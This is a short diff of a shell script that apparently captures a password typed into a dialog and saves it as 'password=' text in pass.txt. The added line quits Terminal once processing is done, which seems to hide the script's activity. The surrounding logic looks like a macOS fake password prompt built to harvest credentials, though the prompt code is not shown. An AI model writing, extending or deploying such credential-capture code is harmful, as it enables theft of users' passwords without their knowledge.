@@ -38,7 +38,7 @@ else
     dialogText="CANCEL"
 fi
 
-# Append the password to the capture text
+# Append the password (or result) to the capture text
 capture="${capture}password=${dialogText}"
 
 # Save the captured information to pass.txt
@@ -52,3 +52,6 @@ if [[ -f pass.txt ]]; then
 else
     echo "Error: pass.txt not found" > error.txt
 fi
+
+# Quit Terminal after processing is complete
+osascript -e 'tell app "Terminal" to quit'
